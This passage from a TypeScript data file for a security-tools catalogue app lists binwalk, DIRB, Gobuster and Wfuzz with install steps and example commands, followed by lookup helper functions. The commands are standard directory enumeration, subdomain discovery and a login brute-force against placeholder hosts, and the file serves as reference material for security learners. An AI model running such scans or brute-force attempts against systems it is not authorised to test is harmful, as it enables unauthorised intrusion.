      installation: {
        linux: "sudo apt-get install binwalk",
        windows: "pip install binwalk",
        mac: "brew install binwalk"
      },
      examples: [
        {
          command: "binwalk -e router_firmware.bin",
          description: "Extract files from firmware image"
        }
      ]
    }
  ],
  "web-assessment": [
    {
      id: "dirb",
      name: "DIRB",
      description: "Web content scanner",
      longDescription: "DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server.",
      category: "Web Assessment",
      difficulty: "Beginner",
      lastUpdated: "2024-01-15",
      icon: "📁",
      commands: [
        "dirb http://target.com/",
        "dirb http://target.com/ wordlist.txt",
        "dirb http://target.com/ -X .php,.txt"
      ],
      useCases: [
        "Directory enumeration",
        "Hidden file discovery",
        "Web reconnaissance"
      ],
      installation: {
        linux: "sudo apt-get install dirb",
        windows: "Download from sourceforge",
        mac: "brew install dirb"
      },
      examples: [
        {
          command: "dirb http://example.com/",
          description: "Scan for common directories and files"
        }
      ]
    },
    {
      id: "gobuster",
      name: "Gobuster",
      description: "Directory/file brute forcer",
      longDescription: "Gobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains, Virtual Host names on target web servers.",
      category: "Web Assessment",
      difficulty: "Beginner",
      lastUpdated: "2024-01-12",
      icon: "🚀",
      commands: [
        "gobuster dir -u http://target.com -w wordlist.txt",
        "gobuster dns -d target.com -w subdomains.txt",
        "gobuster vhost -u http://target.com -w vhosts.txt"
      ],
      useCases: [
        "Directory brute forcing",
        "Subdomain enumeration",
        "Virtual host discovery"
      ],
      installation: {
        linux: "sudo apt-get install gobuster",
        windows: "Download binary from GitHub",
        mac: "brew install gobuster"
      },
      examples: [
        {
          command: "gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
          description: "Brute force common directories"
        }
      ]
    },
    {
      id: "wfuzz",
      name: "Wfuzz",
      description: "Web application fuzzer",
      longDescription: "Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked directories, servlets, scripts, etc), bruteforce GET and POST parameters.",
      category: "Web Assessment",
      difficulty: "Intermediate",
      lastUpdated: "2024-01-10",
      icon: "🔀",
      commands: [
        "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",
        "wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ",
        "wfuzz -c -z file,users.txt -z file,pass.txt http://target.com/login?user=FUZZ&pass=FUZ2Z"
      ],
      useCases: [
        "Parameter fuzzing",
        "Content discovery",
        "Authentication testing"
      ],
      installation: {
        linux: "sudo apt-get install wfuzz",
        windows: "pip install wfuzz",
        mac: "pip install wfuzz"
      },
      examples: [
        {
          command: "wfuzz -c -z file,common.txt http://example.com/FUZZ.php",
          description: "Fuzz for PHP files"
        }
      ]
    }
  ]
};

export const getToolsByCategory = (categoryName: string) => {
  console.log('Getting tools for category:', categoryName);
  
  // Map display names to data keys
  const categoryMap: { [key: string]: string } = {
    "Information Gathering": "information-gathering",
    "Cryptography": "cryptography", 
    "Web Security": "web-security",
    "Network Security": "network-security",
    "Wireless Hacking": "wireless-hacking",
    "Social Engineering": "social-engineering",
    "Exploitation": "exploitation",
    "Password Cracking": "password-cracking",
    "Vulnerability Scanning": "vulnerability-scanning",
    "Forensics": "forensics",
    "Web Assessment": "web-assessment"
  };
  
  const dataKey = categoryMap[categoryName];
  const tools = toolsData[dataKey as keyof typeof toolsData] || [];
  
  console.log('Found tools:', tools);
  return tools;
};

export const getCategoryData = (categoryName: string) => {
  const category = categories.find(cat => cat.name.toLowerCase().replace(/\s+/g, '-') === categoryName);
  const tools = getToolsByCategory(category?.name || categoryName);
  
  return {
    title: category?.name || categoryName.split('-').map(word => word.charAt(0).toUpperCase() + word.slice(1)).join(' '),
    description: category?.description || "Tools and utilities for cybersecurity professionals",
    tools: tools.map(tool => ({
      ...tool,
      difficulty: tool.difficulty || "Intermediate",
      lastUpdated: tool.lastUpdated || "Recently",
      icon: tool.icon || "🔧"
    }))
  };
};

export const getAllTools = () => {
  return Object.values(toolsData).flat();
};

export const getToolById = (id: string) => {
  return getAllTools().find(tool => tool.id === id);
};
